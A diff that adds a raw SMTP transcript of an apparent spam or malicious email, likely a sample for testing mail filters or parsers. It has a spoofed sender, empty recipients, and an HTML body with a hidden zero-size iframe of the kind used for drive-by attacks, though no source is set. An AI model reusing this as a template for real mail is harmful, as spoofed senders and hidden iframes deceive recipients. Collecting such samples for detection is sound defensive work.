@@ -1,0 +1,19 @@
+HELO btamail.net.cn
+MAIL FROM: imissyou@btamail.net.cn
+RCPT TO: 
+DATA
+FROM: LS--20120726RWG@yahoo.com
+TO: 
+SUBJECT: LS--20120726RWG is comming!
+MIME-Version: 1.0
+Content-type: multipart/mixed; boundary="#BOUNDARY#"
+
+
+--#BOUNDARY#
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<html><HEAD></HEAD><body bgColor=3D#ffffff><iframe  height=3D0 width=3D0></=
+iframe></body></html>
+
+--#BOUNDARY#--
